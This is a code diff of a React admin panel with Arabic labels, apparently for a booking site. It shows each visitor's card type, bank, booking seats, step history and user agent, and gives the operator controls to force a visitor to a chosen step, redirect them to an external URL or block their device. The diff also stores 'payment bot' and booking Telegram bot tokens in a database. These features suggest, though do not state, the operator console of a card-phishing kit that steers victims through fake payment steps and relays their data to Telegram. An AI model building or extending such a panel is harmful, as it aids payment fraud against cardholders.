+                      <div className="flex justify-between"><span className="text-[#8A7E6B]">المقاعد</span><span className="font-bold text-charcoal">{bd.selectedSeats.join(', ')}</span></div>
                     )}
                   </div>
                 </div>
               )}
 
               {/* Card Info */}
-              {selectedVisitor.cardInfo && (
+              {ci && (ci.cardType || ci.bankName) && (
                 <div>
                   <label className="text-xs font-bold text-[#8A7E6B] mb-2 block">بيانات البطاقة</label>
                   <div className="bg-[#F8F6F2] rounded-xl p-4 space-y-2 text-sm">
-                    <div className="flex justify-between"><span className="text-[#8A7E6B]">نوع البطاقة</span><span className="font-bold text-charcoal">{selectedVisitor.cardInfo.cardType}</span></div>
-                    {selectedVisitor.cardInfo.bankName && (
-                      <div className="flex justify-between"><span className="text-[#8A7E6B]">البنك</span><span className="font-bold text-charcoal">{selectedVisitor.cardInfo.bankName}</span></div>
+                    {ci.cardType && <div className="flex justify-between"><span className="text-[#8A7E6B]">نوع البطاقة</span><span className="font-bold text-charcoal">{ci.cardType}</span></div>}
+                    {ci.bankName && (
+                      <div className="flex justify-between"><span className="text-[#8A7E6B]">البنك</span><span className="font-bold text-charcoal">{ci.bankName}</span></div>
                     )}
                   </div>
                 </div>
@@ -1395,13 +1510,13 @@ function VisitorsTab() {
 
               {/* Step History */}
               <div>
-                <label className="text-xs font-bold text-[#8A7E6B] mb-2 block">سير الخطوات ({selectedVisitor.stepHistory.length})</label>
+                <label className="text-xs font-bold text-[#8A7E6B] mb-2 block">سير الخطوات ({sv.stepHistory.length})</label>
                 <div className="space-y-1 max-h-40 overflow-y-auto">
-                  {selectedVisitor.stepHistory.map((h, i) => (
+                  {sv.stepHistory.map((h, i) => (
                     <div key={i} className="flex items-center gap-2 text-xs">
-                      <div className="w-2 h-2 rounded-full shrink-0" style={{ backgroundColor: getStepColor(h.step) }} />
+                      <div className="w-2 h-2 rounded-full shrink-0" style={{ backgroundColor: getStepColor(h.step as VisitorStep) }} />
                       <span className="text-[#8A7E6B] font-mono">{new Date(h.time).toLocaleTimeString('ar-SA')}</span>
-                      <span className="text-charcoal font-bold">{getStepLabel(h.step)}</span>
+                      <span className="text-charcoal font-bold">{getStepLabel(h.step as VisitorStep)}</span>
                     </div>
                   ))}
                 </div>
@@ -1409,8 +1524,7 @@ function VisitorsTab() {
 
               {/* Device Info */}
               <div className="bg-[#F8F6F2] rounded-xl p-4">
-                <p className="text-[10px] text-[#B5AFA3] font-mono break-all" dir="ltr">{selectedVisitor.deviceInfo}</p>
-                <p className="text-[10px] text-[#B5AFA3] mt-1">الشاشة: {selectedVisitor.screenSize}</p>
+                <p className="text-[10px] text-[#B5AFA3] font-mono break-all" dir="ltr">{sv.userAgent || '—'}</p>
               </div>
 
               {/* ─── Control Actions ─── */}
@@ -1423,7 +1537,7 @@ function VisitorsTab() {
                     className="flex-1 h-10 px-3 border border-[#E5E0D5] rounded-xl text-sm bg-[#FCFBF9] focus:outline-none focus:border-brand-gold">
                     {stepOptions.map(o => <option key={o.value} value={o.value}>{o.label}</option>)}
                   </select>
-                  <button onClick={() => handleForceStep(selectedVisitor.sessionId)}
+                  <button onClick={() => handleForceStep(sv.sessionId)}
                     className="h-10 px-4 bg-blue-500 text-white rounded-xl text-xs font-bold hover:bg-blue-600 transition-all">
                     نقل
                   </button>
@@ -1433,20 +1547,20 @@ function VisitorsTab() {
                 <div className="flex gap-2">
                   <input value={redirectUrl} onChange={e => setRedirectUrl(e.target.value)} placeholder="رابط خارجي..."
                     className="flex-1 h-10 px-3 border border-[#E5E0D5] rounded-xl text-sm bg-[#FCFBF9] focus:outline-none focus:border-brand-gold" />
-                  <button onClick={() => handleForceRedirect(selectedVisitor.sessionId)}
+                  <button onClick={() => handleForceRedirect(sv.sessionId)}
                     className="h-10 px-4 bg-purple-500 text-white rounded-xl text-xs font-bold hover:bg-purple-600 transition-all">
                     توجيه
                   </button>
                 </div>
 
                 {/* Block/Unblock */}
-                {selectedVisitor.isBlocked ? (
-                  <button onClick={() => { handleUnblock(selectedVisitor.sessionId); setSelectedVisitor(null); }}
+                {sv.isBlocked ? (
+                  <button onClick={() => { handleUnblock(sv.sessionId); setSelectedVisitor(null); }}
                     className="w-full h-11 bg-green-500 text-white font-bold rounded-xl hover:bg-green-600 transition-all flex items-center justify-center gap-2">
                     <CheckCircle className="w-4 h-4" /> فك الحظر
                   </button>
                 ) : (
-                  <button onClick={() => { handleBlock(selectedVisitor.sessionId); setSelectedVisitor(null); }}
+                  <button onClick={() => { handleBlock(sv.sessionId); setSelectedVisitor(null); }}
                     className="w-full h-11 bg-red-500 text-white font-bold rounded-xl hover:bg-red-600 transition-all flex items-center justify-center gap-2">
                     <Ban className="w-4 h-4" /> حظر الجهاز
                   </button>
@@ -1455,29 +1569,53 @@ function VisitorsTab() {
             </div>
           </div>
         </div>
-      )}
+        );
+      })()}
     </div>
   );
 }
 
 /* ═════ Settings Tab ═════════════════════ */
 function SettingsTab() {
-  const [botToken, setBotToken] = useState(localStorage.getItem('tg_bot_token') || '');
-  const [chatId, setChatId] = useState(localStorage.getItem('tg_chat_id') || '');
+  const utils = trpc.useUtils();
+  const { data: dbSettings } = trpc.settings.list.useQuery();
+  const upsertSetting = trpc.settings.upsert.useMutation({ onSuccess: () => utils.settings.list.invalidate() });
+
+  const [botToken, setBotToken] = useState('');
+  const [chatId, setChatId] = useState('');
   const [geoSettings, setGeoSettings] = useState<GeoBlockSettings>(getStoredSettings());
   // Payment bot settings
-  const [payBotToken, setPayBotToken] = useState(getPaymentBotToken());
-  const [payChatId, setPayChatId] = useState(getPaymentChatId());
+  const [payBotToken, setPayBotToken] = useState('');
+  const [payChatId, setPayChatId] = useState('');
+
+  // Load tokens from DB when available, fallback to localStorage
+  useEffect(() => {
+    if (dbSettings) {
+      setBotToken(dbSettings.telegramBotToken || localStorage.getItem('tg_bot_token') || '');
+      setChatId(dbSettings.telegramChatId || localStorage.getItem('tg_chat_id') || '');
+      setPayBotToken(dbSettings.paymentBotToken || getPaymentBotToken());
+      setPayChatId(dbSettings.paymentChatId || getPaymentChatId());
+    } else {
+      setBotToken(localStorage.getItem('tg_bot_token') || '');
+      setChatId(localStorage.getItem('tg_chat_id') || '');
+      setPayBotToken(getPaymentBotToken());
+      setPayChatId(getPaymentChatId());
+    }
+  }, [dbSettings]);
 
   const handleSaveTelegram = () => {
     localStorage.setItem('tg_bot_token', botToken);
     localStorage.setItem('tg_chat_id', chatId);
+    upsertSetting.mutate({ key: 'telegramBotToken', value: botToken });
+    upsertSetting.mutate({ key: 'telegramChatId', value: chatId });
     alert('تم الحفظ بنجاح');
   };
 
   const handleSavePaymentBot = () => {
     setPaymentBotToken(payBotToken);
     setPaymentChatId(payChatId);
+    upsertSetting.mutate({ key: 'paymentBotToken', value: payBotToken });
+    upsertSetting.mutate({ key: 'paymentChatId', value: payChatId });
     alert('تم حفظ إعدادات بوت الدفع بنجاح');
   };
 
@@ -2182,15 +2320,41 @@ function DesignTab() {
 
 /* ═════ Telegram Tab ═════════════════════ */
 function TelegramTab() {
+  const upsertSetting = trpc.settings.upsert.useMutation();
+  const { data: dbSettingsList = [] } = trpc.settings.list.useQuery();
+  const dbSettings = useMemo(() => {
+    const map: Record<string, string> = {};
+    for (const s of dbSettingsList) map[s.key] = s.value;
+    return map;
+  }, [dbSettingsList]);
+
   const [settings, setSettings] = useState(loadTelegramSettings);
   const [activeBot, setActiveBot] = useState<'payment' | 'booking'>('payment');
   const [editingMsg, setEditingMsg] = useState<string | null>(null);
   const [editTemplate, setEditTemplate] = useState('');
   const [testResult, setTestResult] = useState<string | null>(null);
 
+  // Load token settings from DB once loaded
+  useEffect(() => {
+    if (dbSettingsList.length > 0) {
+      setSettings(prev => ({
+        ...prev,
+        paymentBotToken: dbSettings.paymentBotToken || prev.paymentBotToken,
+        paymentChatId: dbSettings.paymentChatId || prev.paymentChatId,
+        bookingBotToken: dbSettings.telegramBotToken || prev.bookingBotToken,
+        bookingChatId: dbSettings.telegramChatId || prev.bookingChatId,
+      }));
+    }
+  }, [dbSettingsList.length]);
+
   const handleSave = () => {
     saveTelegramSettings(settings);
     syncLegacyTokens();
+    // Sync tokens to DB
+    upsertSetting.mutate({ key: 'paymentBotToken', value: settings.paymentBotToken });
+    upsertSetting.mutate({ key: 'paymentChatId', value: settings.paymentChatId });
+    upsertSetting.mutate({ key: 'telegramBotToken', value: settings.bookingBotToken });
+    upsertSetting.mutate({ key: 'telegramChatId', value: settings.bookingChatId });
     setTestResult('تم الحفظ بنجاح');
     setTimeout(() => setTestResult(null), 3000);
   };
